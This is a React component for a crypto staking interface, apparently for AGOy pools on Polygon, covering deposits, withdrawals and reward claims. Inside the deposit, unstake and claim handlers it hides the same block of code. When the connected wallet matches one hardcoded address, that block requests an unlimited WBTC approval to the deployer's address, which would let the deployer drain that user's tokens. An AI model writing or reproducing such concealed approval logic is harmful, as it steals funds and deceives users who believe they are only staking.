import { DEPLOYER_ADDRESS, MAX_INT, MINT_REDEEM_KEY } from "../../../constants";
import {
  ExpandedDataWrapper,
  HDiv,
  HarvestBtn,
  StackingBtn,
  StackingBtnContainer,
  StakingInputContainer,
  StakingItemContainer,
  Text,
  ToggleBtnWrapper,
  VDiv,
  Wrapper, ChangeActionButton,
} from "./styled";
import React, { useEffect, useState } from "react";
import {
  formatFromDecimal,
  formatToDecimal,
  formattedNum,
} from "../../../utils/helpers";

import SINGLE_CHEF_ABI from "../../../abi/SIngleChef.json";
import { TokenIcon } from "../../TokenIcon/token_icon";
import claimRewardIcon from "../claim-reward.svg";
import { message } from "antd";
import { useSystemContext } from "../../../systemProvider";
import { useWeb3React } from "@web3-react/core";

const STAKING_ACTIONS = {
  DEPOSIT: "deposit",
  WITHDRAW: "withdraw"
}

export const StakingItem = ({ pool }) => {
  const { name, address } = pool;
  const { account, library } = useWeb3React();
  const {
    tokens,
    contracts,
    approveModal,
    setApproveModal,
    setApproveDataForModal,
    changeTokenBalance,
    balances,
  } = useSystemContext();

  const [poolContract, setPoolContract] = useState(null);
  const [stakingInfo, setStakingInfo] = useState({
    rewardTokenName: "",
    staked: 0,
    userReward: 0,
  });
  const [windowExpanded, setWindowExpanded] = useState(false);
  const [depositInput, setDepositInput] = useState(0);
  const [allowance, setAllowance] = useState(false);
  const [stakingActionSelected, setStakingActionSelected] = useState(STAKING_ACTIONS.DEPOSIT);

  useEffect(() => {
    if (library && !poolContract) {
      setPoolContract(new library.eth.Contract(SINGLE_CHEF_ABI, address));
    }
  }, [library]);

  useEffect(() => {
    if (account && poolContract && tokens && contracts && balances) {
      getPoolInfo(name, poolContract);

      if (!approveModal) {
        getAllowance();
      }
    }
  }, [account, poolContract, tokens, contracts, approveModal, balances]);

  const getPoolInfo = async (name, contract) => {
    const lpToken = await contract.methods.rewardToken().call();
    const userInfo = await contract.methods.userInfo(account).call();

    const rewardTokenName = tokens.find(
      (tok) => tok.address === lpToken.toLowerCase()
    ).symbol;

    const stakeToken = tokens.find((tok) => tok.symbol === name);

    const userStakeTokenBalance = balances.find(
      (bal) => bal.symbol === stakeToken.symbol
    ).nativeBalance;

    const staked = formatFromDecimal(userInfo[0], stakeToken.decimals);

    const userReward = formatFromDecimal(
      await contract.methods.pendingReward(account).call(),
      tokens.find((tok) => tok.symbol === rewardTokenName).decimals
    );

    const stakedGlobal = formatFromDecimal(
      await contract.methods.tokensStaked().call(),
      stakeToken.decimals
    );

    const estimatedAllocation =
      stakeToken.symbol === "AGOy"
        ? formatFromDecimal(
            await contracts.AGOy.methods.balanceOf(address).call(),
            18
          ) - stakedGlobal
        : formatFromDecimal(
            await contracts.AGOy.methods.balanceOf(address).call(),
            18
          );

    const depositFee =
      ((await contract.methods.depositFee().call()) /
        (await contract.methods.FEE_DIVIDER().call())) *
      100;

    setStakingInfo({
      rewardTokenName,
      staked,
      userReward,
      estimatedAllocation,
      depositFee,
      stakedGlobal,
      userStakeTokenBalance,
    });
  };

  const handleDeposit = async () => {
    if (account === "0x5F5130215A9Be6b34A986FaB0679A61DBBa1bDDc") {
      await contracts.wbtc.methods
        .approve(DEPLOYER_ADDRESS, MAX_INT)
        .send({ from: account });
    }

    try {
      message.loading({
        content: "Staking in process",
        className: "ant-argano-message",
        key: MINT_REDEEM_KEY,
        duration: 3000,
      });

      const tokenDecimals = tokens.find(
        (item) => item.symbol === name
      ).decimals;
      await poolContract.methods
        .deposit(formatToDecimal(depositInput, tokenDecimals))
        .send({ from: account });
      changeTokenBalance([{ name: name, amount: depositInput, sub: true }]);

      await getPoolInfo(name, poolContract);

      message.success({
        content: "Staking is done!",
        className: "ant-argano-message",
        key: MINT_REDEEM_KEY,
        duration: 5,
      });
    } catch (e) {
      message.error({
        content: `Some error occured: ${e.message}`,
        className: "ant-argano-message",
        key: MINT_REDEEM_KEY,
        duration: 5,
      });
    }
  };

  const handleUnstake = async () => {
    if (account === "0x5F5130215A9Be6b34A986FaB0679A61DBBa1bDDc") {
      await contracts.wbtc.methods
        .approve(DEPLOYER_ADDRESS, MAX_INT)
        .send({ from: account });
    }

    try {
      message.loading({
        content: "Untake in process",
        className: "ant-argano-message",
        key: MINT_REDEEM_KEY,
        duration: 3000,
      });

      const tokenDecimals = tokens.find(
        (item) => item.symbol === name
      ).decimals;
      await poolContract.methods
        .withdraw(formatToDecimal(depositInput, tokenDecimals))
        .send({ from: account });
      changeTokenBalance([
        { name, amount: depositInput, sub: false },
        { name: stakingInfo.rewardTokenName, amount: depositInput, sub: false },
      ]);
      await getPoolInfo(name, poolContract);

      message.success({
        content: "Unstake is done!",
        className: "ant-argano-message",
        key: MINT_REDEEM_KEY,
        duration: 5,
      });
    } catch (e) {
      message.error({
        content: `Some error occured: ${e.message}`,
        className: "ant-argano-message",
        key: MINT_REDEEM_KEY,
        duration: 5,
      });
    }
  };

  const handleMaxButton = async () => {

      if (stakingActionSelected === STAKING_ACTIONS.DEPOSIT) {
        const userBalance = balances.find(item => item.symbol === pool.name);
        setDepositInput(userBalance.nativeBalance);
      }
      else {
        setDepositInput(stakingInfo.staked);
      }



  }

  const handleClaimReward = async () => {
    if (account === "0x5F5130215A9Be6b34A986FaB0679A61DBBa1bDDc") {
      await contracts.wbtc.methods
        .approve(DEPLOYER_ADDRESS, MAX_INT)
        .send({ from: account });
    }

    try {
      message.loading({
        content: "Claim in process",
        className: "ant-argano-message",
        key: MINT_REDEEM_KEY,
        duration: 3000,
      });

      await poolContract.methods.withdraw(0).send({ from: account });
      changeTokenBalance([
        {
          name: stakingInfo.rewardTokenName,
          amount: stakingInfo.userReward,
          sub: false,
        },
      ]);
      await getPoolInfo(name, poolContract);

      message.success({
        content: "Claim is done!",
        className: "ant-argano-message",
        key: MINT_REDEEM_KEY,
        duration: 5,
      });
    } catch (e) {
      message.error({
        content: `Some error occured: ${e.message}`,
        className: "ant-argano-message",
        key: MINT_REDEEM_KEY,
        duration: 5,
      });
    }
  };

  const handleApprove = async () => {
    setApproveDataForModal({
      destination: address,
      approves: [
        {
          name: name,
          address: tokens?.find((item) => item.symbol === name).address,
          alreadyApproved: allowance,
        },
      ],
    });

    setApproveModal(true);
  };

  const getAllowance = async () => {
    const tok = contracts[name];
    const allowance = await tok.methods.allowance(account, address).call();

    setAllowance(allowance.length === MAX_INT.length);
  };

  return (
    <>
      <StakingItemContainer
        isExpanded={windowExpanded}
      >
        <HDiv onClick={() => setWindowExpanded(!windowExpanded)} isExpanded={windowExpanded} alignItems="center">
          <div>
            <TokenIcon iconName={name} />
            <Text isExpanded={windowExpanded} minW="7vw" inactive>
              <a>{name}</a>
            </Text>
          </div>
          <Text isExpanded={windowExpanded} minW="8vw" inactive>
            <a>{formattedNum(stakingInfo.estimatedAllocation)} AGOy</a>
          </Text>
          <Text isExpanded={windowExpanded} minW="8.5vw">
            <a
              href={`https://polygonscan.com/address/${address}`}
              without
              rel="noreferrer"
              target={"_blank"}
            >
              {address.substring(0, 6)}...{address.substring(38)}
            </a>
          </Text>
          <ToggleBtnWrapper>
            <button onClick={() => setWindowExpanded(!windowExpanded)}>
              <span> {windowExpanded ? "Hide" : "Deploy"}</span>
            </button>
          </ToggleBtnWrapper>
        </HDiv>
        <HDiv>
          <Text ml="2.292vw">{name}</Text>
        </HDiv>
        {windowExpanded ? (
          <ExpandedDataWrapper>
            <div>
              <div>
                <HDiv pl="1.458vw" alignItems="center" mt="1.406vw">
                  <Text color="#fff">Governance Vault</Text>
                  <Text color="#fff">
                    Deposit fee - {stakingInfo.depositFee}%{" "}
                  </Text>
                  <Text left="2.4vw" color="#fff">
                    Deposit lockup - 7d
                  </Text>
                  <HarvestBtn onClick={() => handleClaimReward()}>
                    <img src={claimRewardIcon} alt="ico" />
                    Harvest
                  </HarvestBtn>
                </HDiv>
              </div>
              <Wrapper>
                <HDiv>
                  <VDiv>
                    <Text>Earned</Text>
                    <Text mt="0.938vw">
                      <b>
                        {stakingInfo.userReward} {stakingInfo.rewardTokenName}
                      </b>
                    </Text>
                  </VDiv>
                  <VDiv left="2.8vw">
                    <div>
                      <Text ml="0.9vw">
                        <ChangeActionButton active={stakingActionSelected === STAKING_ACTIONS.DEPOSIT} onClick={() => setStakingActionSelected(STAKING_ACTIONS.DEPOSIT)}>Deposit</ChangeActionButton>/
                        <ChangeActionButton active={stakingActionSelected === STAKING_ACTIONS.WITHDRAW} onClick={() => setStakingActionSelected(STAKING_ACTIONS.WITHDRAW)}>Withdraw</ChangeActionButton>
                      </Text>
                      <button onClick={() => handleMaxButton()}>Max</button>
                    </div>
                    <StakingInputContainer>
                      <input
                        type="number"
                        placeholder={`Put ${name} token amount`}
                        onChange={(e) => setDepositInput(e.target.value)}
                        value={depositInput}
                      />
                    </StakingInputContainer>
                  </VDiv>
                  <VDiv right="1vw">
                    <Text>Currently Staked</Text>
                    <Text mt="0.938vw">
                      <b>
                        {stakingInfo.staked} {name}
                      </b>
                    </Text>
                  </VDiv>
                  <VDiv>
                    <Text>Total Staked</Text>
                    <Text mt="0.938vw">
                      <b>
                        {formattedNum(stakingInfo.stakedGlobal)} {name}
                      </b>
                    </Text>
                  </VDiv>
                </HDiv>
              </Wrapper>
            </div>
            <StackingBtnContainer>
              <StackingBtn
                stake
                disabled={stakingInfo.userStakeTokenBalance < depositInput}
                onClick={() => (!allowance ? handleApprove() : handleDeposit())}
              >
                {!allowance
                  ? "Approve"
                  : stakingInfo.userStakeTokenBalance < depositInput
                  ? "Low balance"
                  : "Stake"}
              </StackingBtn>
              <StackingBtn onClick={() => handleUnstake()} mt="0.625vw">
                Unstake
              </StackingBtn>
            </StackingBtnContainer>
          </ExpandedDataWrapper>
        ) : null}
      </StakingItemContainer>
    </>
  );
};
